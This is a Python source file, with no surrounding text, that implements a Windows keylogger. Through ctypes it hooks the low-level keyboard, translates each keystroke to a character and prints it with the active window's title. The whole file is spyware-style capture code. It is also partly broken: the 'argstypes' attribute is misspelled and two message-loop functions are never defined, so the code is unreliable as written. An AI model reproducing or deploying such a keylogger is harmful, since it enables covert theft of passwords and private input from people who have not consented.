from ctypes import *
from ctypes import wintypes

user32 = windll.user32

LRESULT = c_long
WH_KEYBOARD_LL = 13

WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argstypes = (wintypes.HANDLE, )
GetWindowTextLengthA.restype = wintypes.INT

GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argstypes = (wintypes.HANDLE, wintypes.LPSTR,wintypes.INT)
GetWindowTextA.restype = wintypes.INT 

GetKeyState = user32.GetKeyState
GetKeyState.argstypes = (wintypes.INT,)
GetKeyState.restype = wintypes.SHORT

keyboard_state = wintypes.BYTE * 256

GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argstypes = (POINTER(keyboard_state),)
GetKeyboardState.restype = wintypes.BOOL

ToAscii = user32.ToAscii
ToAscii.argstypes = (wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), wintypes.LPWORD, wintypes.INT)
ToAscii.restype = wintypes.INT 

CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argstypes = (wintypes.HHOOK, wintypes.INT, wintypes.WPARAM,wintypes.LPARAM)
CallNextHookEx.restype = LRESULT

HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argstypes = (wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD)
SetWindowsHookExA.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argstypes = (wintypes.LPMSG ,wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL

class KBDLLHOOKSSTRUCT(Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", wintypes.DWORD)]

def get_foreground_process():
    hwnd = user32.GetForegroundWindow()
    length = GetWindowTextLengthA(hwnd)
    buff = create_string_buffer(length + 1)
    GetWindowTextA(hwnd, buff, length + 1)
    return buff.value

def hook_function(nCode, wParam, lParam):
    global last
    if last != get_foreground_process():
        last = get_foreground_process()
        print("\n[{}]".format(last.decode("latin-1")))

    if wParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSSTRUCT.from_address(lParam)

        state = (wintypes.BYTE * 256)()
        GetKeyState(WM_SHIFT)
        GetKeyboardState(byref(state))

        buf = (c_ushort * 1)()
        n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)

        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                print()
            else:
                print("{}".format(chr(buf[0])), end="", flush=True)

    return CallNextHookEx(hook, nCode, wParam, wintypes.LPARAM(lParam))

last = None
callback = HOOKPROC(hook_function)
hook = SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0, 0)

msg = wintypes.MSG()
while GetMessageA(byref(msg), 0, 0, 0) != 0:
    TranslateMessage(byref(msg))
    DispatchMessageA(byref(msg))
